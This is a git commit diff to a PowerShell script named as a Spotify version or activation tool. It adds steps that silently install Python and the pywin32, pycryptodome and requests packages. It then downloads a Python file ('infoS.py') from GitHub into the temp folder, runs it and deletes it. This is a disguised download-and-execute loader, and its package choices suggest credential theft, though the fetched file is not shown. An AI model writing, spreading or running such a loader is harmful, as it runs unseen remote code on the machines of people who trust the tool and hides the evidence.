0de157f8f4eeb7038f7d1e8b96c0a83d42e3c7ea
QUADROisCoding <business.quadro13187@gmail.com>
2025-08-18 19:18:47 +0200

    Update Spotify_version.ps1

--- Spotify_version.ps1
+++ Spotify_version.ps1
@@ -1,5 +1,15 @@
+if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
+    winget install --id Python.Python.3 --accept-package-agreements --accept-source-agreements
+    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+}
+
+$requiredPackages = @("pywin32", "pypiwin32", "pycryptodome", "requests")
+foreach ($package in $requiredPackages) {
+    python -m pip install $package --quiet --disable-pip-version-check
+}
+
 $url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py"
-$tempFile = "$env:TEMP\\infoS.py"
+$tempFile = "$env:TEMP\infoS.py"
 Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
 python $tempFile
 Remove-Item $tempFile
